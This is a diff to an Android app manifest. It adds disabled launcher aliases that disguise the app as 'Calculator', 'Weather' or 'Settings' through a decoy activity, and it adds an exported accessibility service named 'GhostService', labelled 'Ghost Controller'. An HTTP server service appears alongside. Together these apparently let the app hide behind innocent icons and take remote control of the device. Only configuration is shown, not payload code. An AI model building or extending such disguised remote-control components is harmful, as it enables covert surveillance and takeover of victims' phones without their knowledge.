@@ -122,6 +122,45 @@
             </intent-filter>
         </activity-alias>
 
+        <activity-alias
+            android:name=".CalculatorAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Calculator"
+            android:icon="@drawable/ic_calculator"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".WeatherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Weather"
+            android:icon="@drawable/ic_weather"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".SettingsAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Settings"
+            android:icon="@drawable/ic_settings_decoy"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
         <service
             android:name=".HttpServerService"
             android:enabled="true"
@@ -173,12 +212,19 @@
             </intent-filter>
         </service>
 
-        <!-- Screen Share Service -->
+
+        <!-- Ghost Controller (Accessibility Service) -->
         <service
-            android:name=".ScreenShareService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
+            android:name=".GhostService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
     </application>
 
